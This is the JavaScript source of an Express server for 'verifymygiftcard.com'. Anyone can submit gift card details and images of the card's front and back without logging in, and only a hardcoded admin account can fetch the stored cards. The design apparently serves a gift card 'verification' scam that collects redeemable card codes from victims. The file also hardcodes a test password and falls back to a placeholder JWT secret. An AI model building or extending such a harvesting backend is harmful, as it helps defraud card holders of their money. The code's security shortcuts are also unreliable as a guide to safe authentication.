import express from 'express';
import collection from './mongo.js';
import cors from 'cors';
import dotenv from 'dotenv';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';

dotenv.config(); // Load environment variables

const app = express();
const PORT = process.env.PORT || 3000; // Use PORT from environment or default to 3000
const SECRET_KEY = process.env.SECRET_KEY || 'your_jwt_secret_key'; // Secure secret key from env

// Hardcoded user for testing purposes
const users = [
  { id: 1, username: 'drizzy', password: bcrypt.hashSync('hawktuah2024', 8) }
];

// Enable CORS with proper configuration
app.use(
  cors({
    origin: 'https://verifymygiftcard.com', // Replace with your frontend URL
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true, // Allow credentials (if needed)
  })
);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Root route to verify the server status
app.get('/', (req, res) => {
  res.send('Server is up and running!');
});

// JWT authentication middleware
const authenticateJWT = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1]; // Extract token from header

  if (!token) {
    return res.status(401).json({ message: 'Authentication token required' });
  }

  jwt.verify(token, SECRET_KEY, (err, decoded) => {
    if (err) {
      console.error('Token verification failed:', err);
      return res.status(403).json({ message: 'Invalid token' });
    }
    req.user = decoded; // Attach user info to the request object
    next(); // Proceed to the next middleware or route handler
  });
};

// Login route to authenticate users
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users.find((u) => u.username === username);

  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.status(401).json({ message: 'Invalid credentials' });
  }

  const token = jwt.sign({ id: user.id }, SECRET_KEY, { expiresIn: '1h' }); // Generate JWT
  res.json({ token }); // Send token back to client
});

// Protected route to fetch gift cards (for admin access only)
app.get('/giftcards', authenticateJWT, async (req, res) => {
  try {
    const giftcards = await collection.find({}); // Fetch gift cards from database
    res.json(giftcards);
  } catch (err) {
    console.error('Error fetching gift cards:', err);
    res.status(500).send('Error fetching gift cards');
  }
});

// Unprotected route to insert gift card data (any user can post without a token)
app.post('/giftcards', async (req, res) => {
  try {
    const { giftCardType, amount, email, frontImage, backImage } = req.body;

    const data = { giftCardType, amount, email, frontImage, backImage };

    await collection.insertMany([data]); // Insert new gift card into the database
    res.status(201).send('Gift card inserted successfully');
  } catch (err) {
    console.error('Error inserting gift card:', err);
    res.status(500).send('Error inserting gift card');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
